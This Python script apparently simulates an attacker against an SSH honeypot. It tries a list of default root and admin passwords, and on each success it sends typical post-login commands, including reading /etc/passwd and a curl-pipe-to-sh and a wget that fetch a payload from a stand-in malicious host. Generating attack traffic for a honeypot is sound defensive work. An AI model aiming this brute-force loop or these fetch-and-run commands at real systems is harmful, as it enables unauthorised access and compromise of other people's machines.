import paramiko
import time
import random
import sys

TARGET_HOST = "honeypot"
TARGET_PORT = 2222

# Credenciais comuns que atacantes reais tentam primeiro
CREDENTIALS = [
    ("root", "123456"),
    ("root", "admin"),
    ("root", "toor"),
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "user"),
    ("root", "raspberry"),
    ("root", ""),
]

# Comandos que um atacante típico corre depois de entrar
POST_LOGIN_COMMANDS = [
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious-update.example/payload.sh",
    "curl -s http://malicious-update.example/init.sh | sh",
    "history",
]

def try_login(username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            TARGET_HOST, port=TARGET_PORT,
            username=username, password=password,
            timeout=5, banner_timeout=5, auth_timeout=5
        )
        print(f"[+] SUCESSO: {username}/{password}")
        shell = client.invoke_shell()
        time.sleep(1)
        for cmd in POST_LOGIN_COMMANDS:
            shell.send(cmd + "\n")
            time.sleep(random.uniform(0.5, 1.5))
            print(f"    > {cmd}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] falhou: {username}/{password}")
        return False
    except Exception as e:
        print(f"[!] erro a ligar: {e}")
        return False

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "fast"
    delay = (2, 5) if mode == "slow" else (0.2, 0.8)

    print(f"[*] a atacar {TARGET_HOST}:{TARGET_PORT} em modo '{mode}'")
    for username, password in CREDENTIALS:
        try_login(username, password)
        time.sleep(random.uniform(*delay))
    print("[*] ataque concluído")